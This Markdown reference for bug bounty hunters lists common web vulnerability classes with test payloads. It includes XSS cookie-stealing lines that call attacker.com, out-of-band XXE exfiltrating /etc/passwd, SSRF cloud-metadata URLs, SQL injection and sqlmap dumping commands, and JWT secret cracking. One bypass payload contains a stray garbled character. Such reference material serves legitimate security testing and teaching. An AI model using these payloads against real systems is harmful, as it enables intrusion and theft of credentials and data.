# Bug Classes Reference

Detailed explanations of common vulnerability types found in bug bounty programs.

## Cross-Site Scripting (XSS)

### Reflected XSS
**Description:** Malicious script reflected off web server via URL parameter.

**Testing:**
```
?search=<script>alert(1)</script>
?name=<img src=x onerror=alert(1)>
```

**Indicators:**
- Input reflected in response without encoding
- URL parameters displayed on page

### Stored XSS
**Description:** Malicious script stored in database and served to users.

**Common Locations:**
- Comments sections
- User profiles
- Message boards
- Reviews
- Admin panels

**Testing:**
```
<script>alert(document.cookie)</script>
<img src=x onerror=fetch('https://attacker.com/log?c='+document.cookie)>
```

### DOM XSS
**Description:** Vulnerability in client-side JavaScript code.

**Sources:**
- document.URL
- document.location
- window.location
- document.referrer

**Sinks:**
- innerHTML
- document.write
- eval()
- setTimeout/setInterval

**Testing:**
Look for JavaScript that takes URL parameters and writes to DOM.

### XSS WAF Bypass Techniques
```
<img src=x onerror=alert(1)>
<img src=x onerror=alert思(1)>
<script>prompt(1)</script>
<scr ipt>alert(1)</scr ipt>
<svg onload=alert(1)>
```

---

## SQL Injection (SQLi)

### Error-Based SQLi
**Description:** Database errors reveal information.

**Testing:**
```sql
' → Triggers error
" → Triggers error
' AND 1=1-- → True condition
' AND 1=2-- → False condition
```

### Union-Based SQLi
**Description:** Use UNION to extract data.

**Steps:**
1. Find number of columns: `' ORDER BY 1--` (increment until error)
2. Find injectable columns: `' UNION SELECT null,null--`
3. Extract data: `' UNION SELECT username,password FROM users--`

### Blind SQLi
**Description:** No direct output, infer from behavior.

**Boolean-Based:**
```sql
' AND 1=1-- → Page loads normally
' AND 1=2-- → Page different/error
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

**Time-Based:**
```sql
' AND IF(1=1, SLEEP(5), 0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### SQLMap Usage
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dump

# Get tables
sqlmap -u "http://target.com/page.php?id=1" --tables

# Specific table
sqlmap -u "http://target.com/page.php?id=1" -T users --dump
```

---

## Insecure Direct Object Reference (IDOR)

**Description:** Access objects by modifying identifiers without authorization checks.

**Common Patterns:**
```
/user/123/profile → /user/124/profile
/api/orders/456 → /api/orders/457
/download?file=report.pdf → /download?file=admin.pdf
```

**Testing:**
1. Access your own resource (note ID)
2. Increment/decrement ID
3. Check if you can access others' data
4. Try different ID formats (UUID, sequential, encoded)

**Advanced IDOR:**
- Parameter pollution: `?user_id=123&user_id=124`
- JSON body manipulation
- HTTP method switching
- Path traversal in IDs

---

## Server-Side Request Forgery (SSRF)

**Description:** Server makes requests to attacker-controlled URLs.

**Basic Test:**
```
?url=http://localhost
?url=http://127.0.0.1
?url=http://0.0.0.0
?url=http://[::1]
```

**Cloud Metadata:**
```
# AWS
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/user-data/

# GCP
?url=http://metadata.google.internal/computeMetadata/v1/

# Azure
?url=http://169.254.169.254/metadata/instance?api-version=2017-04-02
```

**Internal Services:**
```
?url=http://localhost:22 → SSH banner
?url=http://localhost:3306 → MySQL banner
?url=http://internal-service:8080
?url=file:///etc/passwd
```

**Bypass Techniques:**
```
http://0177.0.0.1 (octal)
http://0x7f.0.0.1 (hex)
http://2130706433 (decimal)
http://localhost.attacker.com (DNS)
```

---

## Cross-Site Request Forgery (CSRF)

**Description:** Force users to perform unintended actions.

**Requirements:**
- User is authenticated
- Predictable request structure
- No CSRF token or weak token

**Testing:**
1. Capture legitimate request
2. Remove CSRF token
3. Change token value
4. Check if request still works

**CSRF Token Bypass:**
- Remove token entirely
- Use attacker's token
- Token fixation
- Token not validated server-side

---

## XML External Entity (XXE)

**Description:** Process external entities in XML input.

**Basic Payload:**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

**Out-of-Band XXE:**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd" >
  %xxe;
]>
<foo>&xxe;</foo>
```

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>>"
%eval;
%exfil;
```

---

## Insecure Deserialization

**Description:** Untrusted data deserialized by application.

**Java:**
- Look for serialized objects (base64 encoded)
- ysoserial tool for payload generation

**PHP:**
```php
O:8:"stdClass":1:{s:4:"name";s:6:"attack";}
```

**Python:**
- pickle module vulnerabilities
- Look for `pickle.loads()` usage

**Testing:**
1. Find deserialization endpoints
2. Identify language/framework
3. Generate appropriate payload
4. Test for RCE

---

## Authentication Bypass

### JWT Weaknesses
**None Algorithm:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Weak Secret:**
```bash
# Crack JWT secret
jwt_tool.py eyJ0eXAiOiJKV1Qi... -d /usr/share/wordlists/rockyou.txt
```

**Algorithm Confusion:**
Change RS256 to HS256 and sign with public key.

### Session Fixation
1. Attacker obtains session ID
2. Victim logs in with attacker's session ID
3. Attacker uses same session ID as authenticated user

### Password Reset Flaws
- Token prediction
- Token not expiring
- Token sent to attacker's email
- No rate limiting on reset attempts

---

## Business Logic Flaws

**Description:** Flaws in application workflow logic.

**Examples:**
- Price manipulation: Change price in POST request
- Quantity manipulation: Negative quantities
- Race conditions: Multiple simultaneous requests
- Workflow bypass: Skip payment step
- Time-based attacks: Use expired coupons

**Testing:**
1. Understand business flow
2. Identify decision points
3. Test edge cases
4. Try to break expected workflow

---

## Information Disclosure

**Common Sources:**
- Verbose error messages
- Stack traces
- Debug endpoints (/debug, /console)
- Backup files (.bak, .old, ~)
- Source code comments
- API responses with extra data
- Directory listing
- .git/.svn/.hg exposure

**Testing:**
```
/.git/config
/.env
/backup.sql
/debug
/console
/api/v1/users (check for extra fields)
```

---

## File Upload Vulnerabilities

**Dangerous Extensions:**
```
.php, .jsp, .asp, .aspx, .py, .rb, .pl, .sh
```

**Bypass Techniques:**
- Double extension: file.php.jpg
- Null byte: file.php%00.jpg
- Case variation: file.PHP
- Alternate extensions: .php5, .phtml
- MIME type spoofing

**Testing:**
1. Upload legitimate file
2. Try dangerous extensions
3. Check if file is executable
4. Try path traversal in filename

---

## Severity Ratings

| Severity | CVSS Score | Examples |
|----------|------------|----------|
| Critical | 9.0-10.0 | RCE, SQLi with data exfil, Auth bypass to admin |
| High | 7.0-8.9 | Stored XSS, IDOR sensitive data, SSRF internal |
| Medium | 4.0-6.9 | Reflected XSS, CSRF, Information disclosure |
| Low | 0.1-3.9 | Missing headers, Verbose errors |
| Info | 0.0 | Best practice suggestions |

## Resources

- PortSwigger Web Security Academy
- OWASP Testing Guide
- HackerOne Hacktivity (disclosed reports)
- Bug Bounty Hunter Methodology (YouTube)
